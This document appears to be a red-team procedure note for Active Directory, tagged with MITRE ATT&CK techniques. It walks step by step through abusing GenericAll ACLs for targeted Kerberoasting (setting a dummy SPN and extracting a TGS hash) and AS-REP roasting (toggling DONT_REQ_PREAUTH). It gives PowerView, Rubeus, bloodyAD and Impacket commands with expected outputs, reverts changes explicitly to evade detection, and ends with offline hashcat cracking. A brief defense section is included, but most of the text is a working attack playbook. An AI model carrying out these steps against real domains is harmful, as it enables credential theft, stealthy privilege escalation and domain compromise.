---
type: procedure
verified: true
submitted: false
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
sub_techniques:
  - '[[sub-techniques/Kerberoasting|T1558.003 - Kerberoasting]]'
  - '[[sub-techniques/Silver Ticket|T1558.002 - Silver Ticket]]'
tags:
  - '[[tags/Abusing Active Directory ACLs/ACEs]]'
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/GenericAll]]'
commands:
  - '[[commands/powerview-invoke-aclscanner-check-permissions]]'
  - '[[commands/powerview-get-domainuser-check-spn]]'
  - '[[commands/powerview-set-domainobject-set-spn]]'
  - '[[commands/powerview-get-domainuser-get-spnticket]]'
  - '[[commands/powerview-set-domainobject-clear-spn]]'
  - '[[commands/powerview-get-domainuser-convert-uac]]'
  - '[[commands/powerview-set-domainobject-xor-uac]]'
  - '[[commands/rubeus-get-asrephash]]'
  - '[[commands/impacket-getnpusers-grab-asrep]]'
  - '[[commands/bloodyad-set-uac-enable]]'
  - '[[commands/bloodyad-set-uac-disable]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerView]]'
  - '[[tools/Impacket]]'
  - '[[tools/Rubeus]]'
  - '[[tools/bloodyad]]'
validated: true
---

# Active-Directory-ACL-Abuse-via-Kerberoasting-and-AS-REP-Roasting

## Summary

This procedure abuses Active Directory ACLs, specifically targeting accounts with GenericAll permissions, to perform targeted Kerberoasting and AS-REP Roasting attacks. It enables attackers to set SPNs on user accounts for Kerberoasting or modify the userAccountControl attribute to disable pre-authentication for AS-REP Roasting, extract crackable Kerberos tickets, and revert changes to avoid detection. This allows offline password cracking to gain access to sensitive domain resources.

## Description

In Active Directory environments, misconfigured ACLs granting GenericAll rights to unprivileged users can allow manipulation of user objects. This procedure exploits such permissions to perform Kerberoasting by forcing an SPN on a target account, requesting a TGS ticket, and extracting it for cracking. For AS-REP Roasting, it temporarily disables Kerberos pre-authentication (DONT_REQ_PREAUTH flag, value 4194304 or 0x400000) on the target, requests an AS-REP response, and re-enables it. Tools like PowerView (PowerShell) or Impacket/BloodyAD (Python) are used on a domain-joined Windows machine or Linux host with domain access. Success leads to password hashes that can be cracked with tools like Hashcat, potentially compromising service accounts or users with elevated privileges. This targets Windows Server AD domains and requires initial low-privilege domain credentials.

## Requirements

1. Valid domain user credentials with GenericAll permissions on target accounts (often via group membership like RDPUsers).
2. Access to a domain-joined Windows machine for PowerShell tools or a Linux machine with Python for Impacket.
3. Installed tools: PowerView module, Rubeus.exe, Impacket suite, BloodyAD.py.
4. Network connectivity to a Domain Controller (ports 88/TCP for Kerberos, 389/TCP for LDAP).

## Defense

- Strictly limit GenericAll permissions to trusted admin groups and audit ACLs regularly using tools like BloodHound or AD auditing.
- Monitor for anomalous LDAP modifications (e.g., SPN sets, UAC changes) via Windows Event Logs (ID 5136) or SIEM rules.
- Enforce strong password policies, enable Kerberos pre-authentication enforcement, and use protected users groups to prevent roasting.
- Implement anomaly detection for unusual TGS/AS-REP requests and offline cracking attempts.

## Objectives

1. Identify target accounts with abusable ACLs (GenericAll).
2. Extract crackable Kerberos tickets (TGS for Kerberoasting, AS-REP for roasting) via ACL abuse.
3. Revert modifications to maintain stealth and crack hashes offline for credential access.
4. Achieve domain compromise by using cracked passwords for lateral movement or privilege escalation.

## Instructions

This procedure is divided into two main paths: Kerberoasting via SPN manipulation and AS-REP Roasting via UAC modification. Use PowerView for Windows-based execution or Impacket/BloodyAD for cross-platform. Always verify permissions first and revert changes post-extraction to evade detection.

### Step 1: Identify Abusable ACLs on Target Accounts

**Context**: Scan for accounts where the current user has GenericAll rights, such as via RDPUsers group, to confirm exploitability. This step uses PowerView to query AD ACLs.

**Command** ([[commands/powerview-invoke-aclscanner-check-permissions]]):
```powershell
Invoke-ACLScanner -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "RDPUsers" }
```

> This command enumerates ACLs across AD objects and filters for permissions granted to RDPUsers (or similar groups). It resolves GUIDs to friendly names for readability. Run in a PowerShell session with PowerView loaded.

**Expected Output**: A list of objects showing ActiveDirectoryRights like GenericAll on user accounts, e.g., ObjectDN: CN=TargetUser, IdentityReference: RDPUsers, ActiveDirectoryRights: GenericAll.

If no results, expand the filter (e.g., match other groups) or use full ACLScanner without filter to identify GenericAll broadly.

### Step 2: Perform Kerberoasting via SPN Abuse (PowerView Path)

**Context**: If GenericAll is confirmed on a target user (e.g., $_TARGET_USER), check for existing SPN, set a dummy SPN, request the TGS ticket, extract it, and clear the SPN. This targets the account for roasting.

**Command** ([[commands/powerview-get-domainuser-check-spn]]):
```powershell
Get-DomainUser -Identity $_TARGET_USER | Select-Object serviceprincipalname
```

> Checks if the target already has an SPN set, which would make roasting unnecessary or require cleanup.

**Expected Output**: serviceprincipalname : {} (empty if none) or a list if present.

If empty, proceed:

**Command** ([[commands/powerview-set-domainobject-set-spn]]):
```powershell
Set-DomainObject $_TARGET_USER -Set @{serviceprincipalname='$_SPN_VALUE'}
```

> Sets a dummy SPN (e.g., ops/whatever1) on the target using GenericAll rights. Use PowerView v3 syntax if needed: Set-DomainObject -Identity $_TARGET_USER -Set @{serviceprincipalname='$_SPN_VALUE'}.

**Expected Output**: Verbose confirmation: "Set-DomainObject function completed."

**Command** ([[commands/powerview-get-domainuser-get-spnticket]]):
```powershell
$User = Get-DomainUser $_TARGET_USER; $User | Get-DomainSPNTicket | Format-List; $User | Select-Object serviceprincipalname
```

> Requests and displays the TGS ticket for the new SPN, saving the hash for cracking (e.g., pipe to file: | Select-Object -ExpandProperty Hash | Out-File ticket.hash).

**Expected Output**: Ticket details including $krb5tgs$23$*user$domain$spn*$hash (crackable with Hashcat mode 13100).

**Command** ([[commands/powerview-set-domainobject-clear-spn]]):
```powershell
Set-DomainObject -Identity $_TARGET_USER -Clear serviceprincipalname
```

> Removes the SPN to restore the account and avoid alerting admins.

**Expected Output**: Confirmation of clearance.

### Step 3: Perform AS-REP Roasting via UAC Abuse (PowerView Path)

**Context**: For AS-REP, check current UAC, XOR to disable pre-auth (add 4194304), request AS-REP hash, then revert. This exploits GenericAll to flip the DONT_REQ_PREAUTH flag.

**Command** ([[commands/powerview-get-domainuser-convert-uac]]):
```powershell
Get-DomainUser $_TARGET_USER | ConvertFrom-UACValue
```

> Decodes the current userAccountControl value to confirm pre-auth is enabled (no DONT_REQ_PREAUTH).

**Expected Output**: Flags like AccountDisabled : False, DontReqPreAuth : False.

**Command** ([[commands/powerview-set-domainobject-xor-uac]]):
```powershell
Set-DomainObject -Identity $_TARGET_USER -XOR @{useraccountcontrol=4194304} -Verbose
```

> XORs the UAC to enable DONT_REQ_PREAUTH (disables pre-auth).

**Expected Output**: Verbose: "Modified userAccountControl for CN=TargetUser."

**Command** ([[commands/rubeus-get-asrephash]]):
```powershell
Get-ASREPHash -Domain $_DOMAIN -UserName $_TARGET_USER
```

> Requests the AS-REP response (hash) using Rubeus or equivalent, as pre-auth is now disabled.

**Expected Output**: $krb5asrep$23$username@domain:guid:hash (crackable with Hashcat mode 18200).

Re-check UAC with [[commands/powerview-get-domainuser-convert-uac]], then revert:

**Command** ([[commands/powerview-set-domainobject-xor-uac]]):
```powershell
Set-DomainObject -Identity $_TARGET_USER -XOR @{useraccountcontrol=4194304} -Verbose
```

> XOR again to re-enable pre-auth.

**Expected Output**: UAC restored, DontReqPreAuth : False.

### Step 4: Alternative AS-REP Roasting via UAC Abuse (Impacket/BloodyAD Path)

**Context**: Cross-platform alternative using Python tools. Set UAC flag with BloodyAD, grab AS-REP with GetNPUsers.py, then revert.

**Command** ([[commands/bloodyad-set-uac-enable]]):
```bash
python3 bloodyAD.py --host $_DC_IP -d $_DOMAIN -u $_ATTACKER_USER -p '$_ATTACKER_PASSWORD' setUserAccountControl $_TARGET_USER 0x400000 True
```

> Enables DONT_REQ_PREAUTH flag on target.

**Expected Output**: "UserAccountControl modified successfully."

**Command** ([[commands/impacket-getnpusers-grab-asrep]]):
```bash
python3 GetNPUsers.py $_DOMAIN/$_TARGET_USER -format $_FORMAT -outputfile $_OUTPUT_FILE
```

> Requests AS-REP hash in hashcat or john format (e.g., -format hashcat).

**Expected Output**: Hash line in output file, e.g., $krb5asrep$23$... .

**Command** ([[commands/bloodyad-set-uac-disable]]):
```bash
python3 bloodyAD.py --host $_DC_IP -d $_DOMAIN -u $_ATTACKER_USER -p '$_ATTACKER_PASSWORD' setUserAccountControl $_TARGET_USER 0x400000 False
```

> Disables the flag to restore.

**Expected Output**: "UserAccountControl reverted."

Post-extraction, crack hashes offline (e.g., hashcat -m 13100 ticket.hash wordlist.txt) to obtain plaintext passwords for further exploitation.
